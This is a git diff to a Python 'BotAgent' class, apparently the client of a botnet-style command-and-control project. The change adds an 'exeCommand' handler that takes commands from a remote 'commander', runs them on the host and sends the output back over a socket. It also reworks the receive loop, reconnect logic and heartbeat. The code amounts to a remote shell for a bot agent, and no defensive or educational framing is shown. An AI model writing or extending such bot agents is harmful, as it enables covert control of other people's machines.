@@ -140,6 +140,14 @@ class BotAgent:
             case "botHelloReply":
                 print("Bot-agent {} received botHelloReply from commander".format(self.hostname))
                 self.last_online = time.time()
+            case "exeCommand":
+                response = self.__execute_command(data.decode("utf-8"))
+                if response:
+                    payload = self.__build_json_payload("exeCommandReply", optional=(data.decode("utf-8"),
+                                                                                     response.decode("utf-8")))
+                    return payload
+                else:
+                    return False
             case _:
                 print("Bot-agent {} received an unknown message from commander: {}".format(self.hostname, msg))
                 return False
@@ -191,23 +199,19 @@ class BotAgent:
                       format(self.hostname, err))
                 self.__self_identify()
             if data:
-                self.__process_input_stream(data)
-                response = self.__execute_command(data.decode("utf-8"))
-                if response:
-                    payload = self.__build_json_payload("exeCommandReply", optional=(data.decode("utf-8"),
-                                                                                     response.decode("utf-8")))
-                    if payload:
-                        try:
-                            print(
-                                "Sending {} from bot-agent {} to commander".format(payload.decode("utf-8"), self.hostname))
-                            self.sock.sendall(payload)
-                            self.last_online = time.time()
-                        except Exception as err:
-                            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(
-                                self.hostname, data, err))
-                            self.__self_identify()
-                    else:
+                result = self.__process_input_stream(data)
+                if result:
+                    try:
+                        print(
+                            "Sending {} from bot-agent {} to commander".format(result.decode("utf-8"), self.hostname))
+                        self.sock.sendall(result)
+                        self.last_online = time.time()
+                    except Exception as err:
+                        print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(
+                            self.hostname, data, err))
                         self.__self_identify()
+                else:
+                    self.__self_identify()
 
     def __execute_command(self, data):
         try:
